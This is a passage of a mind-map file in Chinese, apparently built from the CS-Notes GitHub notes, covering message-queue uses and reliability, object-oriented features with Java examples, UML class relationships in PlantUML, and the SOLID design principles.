      发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。
    </p>
    <p dir="auto">
      例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。
    </p>
    <p dir="auto">
      只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_279166805" CREATED="1754750651132" MODIFIED="1754750651133"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      流量削锋
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 流量削锋" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#流量削锋">
</a>
    <p dir="auto">
      在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。
    </p>
    <p dir="auto">
      可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_498414588" CREATED="1754750651134" MODIFIED="1754750651135"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      应用解耦
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 应用解耦" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#应用解耦">
</a>
    <p dir="auto">
      如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。
    </p>
    <p dir="auto">
      通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1601238658" CREATED="1754750651136" MODIFIED="1754750651136"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、可靠性
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_24751608" CREATED="1754750651137" MODIFIED="1754750651138"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      发送端的可靠性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 发送端的可靠性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#发送端的可靠性">
</a>
    <p dir="auto">
      发送端完成操作后一定能将消息成功发送到消息队列中。
    </p>
    <p dir="auto">
      实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_690201197" CREATED="1754750651139" MODIFIED="1754750651140"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      接收端的可靠性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 接收端的可靠性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#接收端的可靠性">
</a>
    <p dir="auto">
      接收端能够从消息队列成功消费一次消息。
    </p>
    <p dir="auto">
      两种实现方法：
    </p>
    <ul dir="auto">
      <li>
        保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。
      </li>
      <li>
        保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_168959519" CREATED="1754750651141" MODIFIED="1754750651142"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        <a href="http://developers-club.com/posts/270339/" rel="nofollow">Observer vs Pub-Sub</a>
      </li>
      <li>
        <a href="https://blog.csdn.net/lizhitao/article/details/47723105" rel="nofollow">消息队列中点对点与发布订阅区别</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" POSITION="top_or_left" ID="ID_1135874433" CREATED="1754749744686" MODIFIED="1754749811340" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>面向对象</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_199527742" CREATED="1754749811330" MODIFIED="1754750714374" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      面向对象思想
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1563440861" CREATED="1754750651144" MODIFIED="1754750651144"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、三大特性
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1680986433" CREATED="1754750651146" MODIFIED="1754750651147"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      封装
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 封装" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#封装">
</a>
    <p dir="auto">
      利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。
    </p>
    <p dir="auto">
      优点：
    </p>
    <ul dir="auto">
      <li>
        减少耦合：可以独立地开发、测试、优化、使用、理解和修改
      </li>
      <li>
        减轻维护的负担：可以更容易被理解，并且在调试的时候可以不影响其他模块
      </li>
      <li>
        有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能
      </li>
      <li>
        提高软件的可重用性
      </li>
      <li>
        降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的
      </li>
    </ul>
    <p dir="auto">
      以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。
    </p>
    <p dir="auto">
      注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。
    </p>
    <pre>public class Person {
    private String name;
    private int gender;
    private int age;
    public String getName() {
        return name;
    }
    public String getGender() {
        return gender == 0 ? &quot;man&quot; : &quot;woman&quot;;
    }
    public void work() {
        if (18 &lt;= age &amp;&amp; age &lt;= 50) {
            System.out.println(name + &quot; is working very hard!&quot;);
        } else {
            System.out.println(name + &quot; can't work any more!&quot;);
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1696701071" CREATED="1754750651148" MODIFIED="1754750651149"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      继承
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 继承" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#继承">
</a>
    <p dir="auto">
      继承实现了 <strong>IS-A</strong>&#xa0;关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。
    </p>
    <p dir="auto">
      继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。
    </p>
    <p dir="auto">
      Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 <strong>向上转型</strong>&#xa0;。
    </p>
    <pre>Animal animal = new Cat();</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1538174979" CREATED="1754750651149" MODIFIED="1754750651151"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      多态
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 多态" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#多态">
</a>
    <p dir="auto">
      多态分为编译时多态和运行时多态：
    </p>
    <ul dir="auto">
      <li>
        编译时多态主要指方法的重载
      </li>
      <li>
        运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定
      </li>
    </ul>
    <p dir="auto">
      运行时多态有三个条件：
    </p>
    <ul dir="auto">
      <li>
        继承
      </li>
      <li>
        覆盖（重写）
      </li>
      <li>
        向上转型
      </li>
    </ul>
    <p dir="auto">
      下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。
    </p>
    <pre>public class Instrument {
    public void play() {
        System.out.println(&quot;Instument is playing...&quot;);
    }
}</pre>
    <pre>public class Wind extends Instrument {
    public void play() {
        System.out.println(&quot;Wind is playing...&quot;);
    }
}</pre>
    <pre>public class Percussion extends Instrument {
    public void play() {
        System.out.println(&quot;Percussion is playing...&quot;);
    }
}</pre>
    <pre>public class Music {
    public static void main(String[] args) {
        List&lt;Instrument&gt; instruments = new ArrayList&lt;&gt;();
        instruments.add(new Wind());
        instruments.add(new Percussion());
        for(Instrument instrument : instruments) {
            instrument.play();
        }
    }
}</pre>
    <pre class="notranslate">Wind is playing...
Percussion is playing...</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_974676027" CREATED="1754750651152" MODIFIED="1754750651154"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、类图
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、类图" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#二类图">
</a>
    <p dir="auto">
      以下类图使用 <a href="https://www.planttext.com/" rel="nofollow">PlantUML</a>&#xa0;绘制，更多语法及使用请参考：<a href="http://plantuml.com/" rel="nofollow">http://plantuml.com/</a>&#xa0;。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1941094157" CREATED="1754750651154" MODIFIED="1754750651155"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      泛化关系 (Generalization)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 泛化关系 (Generalization)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#泛化关系-generalization">
</a>
    <p dir="auto">
      用来描述继承关系，在 Java 中使用 extends 关键字。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ac9db650e3992b03c913a62e8b9282dba2eeca75416007758b95584718ce7377/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63303837346530612d646261332d343637652d396338362d6464393331336530383433652e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/ac9db650e3992b03c913a62e8b9282dba2eeca75416007758b95584718ce7377/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63303837346530612d646261332d343637652d396338362d6464393331336530383433652e6a7067" width="180px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0874e0a-dba3-467e-9c86-dd9313e0843e.jpg"/>
    </a><br/>
    

    <pre lang="text" class="notranslate">@startuml
title Generalization
class Vihical
class Car
class Trunck
Vihical &lt;|-- Car
Vihical &lt;|-- Trunck
@enduml</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1573983744" CREATED="1754750651156" MODIFIED="1754750651157"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      实现关系 (Realization)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 实现关系 (Realization)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#实现关系-realization">
</a>
    <p dir="auto">
      用来实现一个接口，在 Java 中使用 implements 关键字。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a49ff4bfd131ba4ad42261973e9f7a77ea0db5b6937353cf1a92e8cea3a263c8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38336434363662642d393436622d343433302d383534612d6366376230363936643463382e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/a49ff4bfd131ba4ad42261973e9f7a77ea0db5b6937353cf1a92e8cea3a263c8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38336434363662642d393436622d343433302d383534612d6366376230363936643463382e6a7067" width="170px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/83d466bd-946b-4430-854a-cf7b0696d4c8.jpg"/>
    </a><br/>
    

    <pre lang="text" class="notranslate">@startuml
title Realization
interface MoveBehavior
class Fly
class Run
MoveBehavior &lt;|.. Fly
MoveBehavior &lt;|.. Run
@enduml</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1898130934" CREATED="1754750651158" MODIFIED="1754750651159"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      聚合关系 (Aggregation)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 聚合关系 (Aggregation)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#聚合关系-aggregation">
</a>
    <p dir="auto">
      表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4c0648a646f7ecedc3b0e1f4c11636aafb00590f92ca721edc179278bce328b5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61306365343362372d616661382d343339372d613936652d3563313261303730663261652e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/4c0648a646f7ecedc3b0e1f4c11636aafb00590f92ca721edc179278bce328b5/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61306365343362372d616661382d343339372d613936652d3563313261303730663261652e6a7067" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a0ce43b7-afa8-4397-a96e-5c12a070f2ae.jpg"/>
    </a><br/>
    

    <pre lang="text" class="notranslate">@startuml
title Aggregation
class Computer
class Keyboard
class Mouse
class Screen
Computer o-- Keyboard
Computer o-- Mouse
Computer o-- Screen
@enduml</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1655820912" CREATED="1754750651160" MODIFIED="1754750651161"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      组合关系 (Composition)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 组合关系 (Composition)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#组合关系-composition">
</a>
    <p dir="auto">
      和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c182db1f374a3ea44b3a76a3b151f44406cc6d9602bc084578f0b7fc20d288d9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36613838613339382d633439342d343166352d626236322d3966376662383131646637632e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/c182db1f374a3ea44b3a76a3b151f44406cc6d9602bc084578f0b7fc20d288d9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36613838613339382d633439342d343166352d626236322d3966376662383131646637632e6a7067" width="280px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6a88a398-c494-41f5-bb62-9f7fb811df7c.jpg"/>
    </a><br/>
    

    <pre lang="text" class="notranslate">@startuml
title Composition
class Company
class DepartmentA
class DepartmentB
Company *-- DepartmentA
Company *-- DepartmentB
@enduml</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_782377916" CREATED="1754750651162" MODIFIED="1754750651163"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      关联关系 (Association)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 关联关系 (Association)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#关联关系-association">
</a>
    <p dir="auto">
      表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6fdef349b7ef88da5eb1818c548ed5c9defd8c75a7ed947a90ba482aa60455e2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61336534646336322d306461352d346432322d393466322d3134303037383238313831322e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/6fdef349b7ef88da5eb1818c548ed5c9defd8c75a7ed947a90ba482aa60455e2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61336534646336322d306461352d346432322d393466322d3134303037383238313831322e6a7067" width="200px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a3e4dc62-0da5-4d22-94f2-140078281812.jpg"/>
    </a><br/>
    

    <pre lang="text" class="notranslate">@startuml
title Association
class School
class Student
School &quot;1&quot; - &quot;n&quot; Student
@enduml</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_447532180" CREATED="1754750651164" MODIFIED="1754750651165"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      依赖关系 (Dependency)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 依赖关系 (Dependency)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#依赖关系-dependency">
</a>
    <p dir="auto">
      和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式：
    </p>
    <ul dir="auto">
      <li>
        A 类是 B 类方法的局部变量；
      </li>
      <li>
        A 类是 B 类方法的参数；
      </li>
      <li>
        A 类向 B 类发送消息，从而影响 B 类发生变化。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/942fe40620bbc3047e7586f42b83a33acfb1132fe0179ce11d5d0056e2da4c6d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33373934343463392d663164312d343563642d623761612d6230633138343237643338382e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/942fe40620bbc3047e7586f42b83a33acfb1132fe0179ce11d5d0056e2da4c6d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f33373934343463392d663164312d343563642d623761612d6230633138343237643338382e6a7067" width="330px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/379444c9-f1d1-45cd-b7aa-b0c18427d388.jpg"/>
    </a><br/>
    

    <pre lang="text" class="notranslate">@startuml
title Dependency
class Vihicle {
    move(MoveBehavior)
}
interface MoveBehavior {
    move()
}
note &quot;MoveBehavior.move()&quot; as N
Vihicle ..&gt; MoveBehavior
Vihicle .. N
@enduml</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1692096752" CREATED="1754750651165" MODIFIED="1754750651165"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、设计原则
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1669329683" CREATED="1754750651167" MODIFIED="1754750651168"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      S.O.L.I.D
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: S.O.L.I.D" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#solid">
</a><markdown-accessiblity-table/>
    <table>
      <tr>
        <th>
          简写
        </th>
        <th>
          全拼
        </th>
        <th>
          中文翻译
        </th>
      </tr>
      <tr>
        <td>
          SRP
        </td>
        <td>
          The Single Responsibility Principle
        </td>
        <td>
          单一责任原则
        </td>
      </tr>
      <tr>
        <td>
          OCP
        </td>
        <td>
          The Open Closed Principle
        </td>
        <td>
          开放封闭原则
        </td>
      </tr>
      <tr>
        <td>
          LSP
        </td>
        <td>
          The Liskov Substitution Principle
        </td>
        <td>
          里氏替换原则
        </td>
      </tr>
      <tr>
        <td>
          ISP
        </td>
        <td>
          The Interface Segregation Principle
        </td>
        <td>
          接口分离原则
        </td>
      </tr>
      <tr>
        <td>
          DIP
        </td>
        <td>
          The Dependency Inversion Principle
        </td>
        <td>
          依赖倒置原则
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
<node ID="ID_1236284838" CREATED="1754750651169" MODIFIED="1754750651171"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 单一责任原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 单一责任原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#1-单一责任原则">
</a>
    <blockquote>
      <p dir="auto">
        修改一个类的原因应该只有一个。
      </p>
    </blockquote>
    <p dir="auto">
      换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。
    </p>
    <p dir="auto">
      如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_35297020" CREATED="1754750651171" MODIFIED="1754750651173"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 开放封闭原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 开放封闭原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#2-开放封闭原则">
</a>
    <blockquote>
      <p dir="auto">
        类应该对扩展开放，对修改关闭。
      </p>
    </blockquote>
    <p dir="auto">
      扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。
    </p>
    <p dir="auto">
      符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1327510040" CREATED="1754750651174" MODIFIED="1754750651175"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 里氏替换原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 里氏替换原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#3-里氏替换原则">
</a>
    <blockquote>
      <p dir="auto">
        子类对象必须能够替换掉所有父类对象。
      </p>
    </blockquote>
    <p dir="auto">
      继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。
    </p>
    <p dir="auto">
      如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_653994628" CREATED="1754750651176" MODIFIED="1754750651177"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 接口分离原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 接口分离原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#4-接口分离原则">
</a>
    <blockquote>
      <p dir="auto">
        不应该强迫客户依赖于它们不用的方法。
      </p>
    </blockquote>
    <p dir="auto">
      因此使用多个专门的接口比使用单一的总接口要好。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1271239642" CREATED="1754750651178" MODIFIED="1754750651179"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 依赖倒置原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 依赖倒置原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#5-依赖倒置原则">
</a>
    <blockquote>
      <p dir="auto">
        高层模块不应该依赖于低层模块，二者都应该依赖于抽象；<br/>抽象不应该依赖于细节，细节应该依赖于抽象。
      </p>
    </blockquote>
    <p dir="auto">
      高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。
    </p>
    <p dir="auto">
      依赖于抽象意味着：
    </p>
    <ul dir="auto">
      <li>
        任何变量都不应该持有一个指向具体类的指针或者引用；
      </li>
      <li>
        任何类都不应该从具体类派生；
      </li>
      <li>
        任何方法都不应该覆写它的任何基类中的已经实现的方法。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1699080654" CREATED="1754750651179" MODIFIED="1754750651181"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      其他常见原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 其他常见原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#其他常见原则">
</a>
    <p dir="auto">
      除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          简写
        </th>
        <th>
          全拼
        </th>
        <th>
          中文翻译
        </th>
      </tr>
      <tr>
        <td>
          LOD
        </td>
        <td>
          The Law of Demeter
        </td>
        <td>
          迪米特法则
        </td>
      </tr>
